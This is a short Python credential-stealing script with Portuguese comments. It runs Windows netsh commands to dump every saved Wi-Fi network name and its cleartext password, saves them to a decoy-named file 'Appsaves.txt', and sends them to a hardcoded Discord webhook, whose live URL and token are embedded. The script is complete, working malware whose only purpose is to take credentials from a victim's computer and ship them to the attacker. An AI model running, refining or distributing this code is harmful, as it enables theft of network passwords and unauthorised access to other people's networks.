import subprocess
import datetime
from discord_webhook import DiscordWebhook

# Pega a senha do wifi atraves do comando "netsh wlan show profiles" e formata pra mostrar apenas nomes e senhas das redes.

def get_networks():
    information_command = subprocess.check_output("netsh wlan show profiles", encoding="cp858", shell=True)
    networks = []
    for line in information_command.split('\n'):
        if "Todos os Perfis de Usuários" in line:
            position = line.find(":")
            network = line[position + 2:]
            password = information_network(network)
            networks.append("## Nome = "+ network + "// Senha = " + password)
            networkz = "\n".join(networks)
    return networkz

def information_network(wifi):
    information_command = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key", "=", "clear"],
                                                  encoding="cp858", shell=True)
    network = ''
    for line in information_command.split('\n'):
        if "Conteúdo da Chave" in line:
            position = line.find(":")
            network = line[position + 2:]
            break
    return network

# Informa o dia e a hora que as informações foram coletadas.

dia = datetime.datetime.now()

# Salva as informações coletadas em um arquivo .txt.
# O motivo de salvar esse arquivo é pelo fato de que o webhook nao recebe informações do tipo funcion...
# ou seja pra informação chegar correta no webhook e necessario que a informação esteja em formato string.

with open ("Appsaves.txt", "w") as arquivos:
    arquivos.write("# Opa, Wifi fresco pingou: \n {} // {} \n".format(get_networks(),dia))

# Pega as informações do arquivo .txt ja transformada em string prontas para serem enviadas para o webhook.

with open ("Appsaves.txt", "r") as senhasgamers:
    NetInject = senhasgamers.read()
    
# Integração webhook com o discord.

webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1150539523663605882/Z_AezEKC5gYw_TCE20canPY0qygZGIRYS4ia0EeATCZJwOoWtoARNdv-MFfUWqlVpNON", content="{}".format(NetInject))
response = webhook.execute()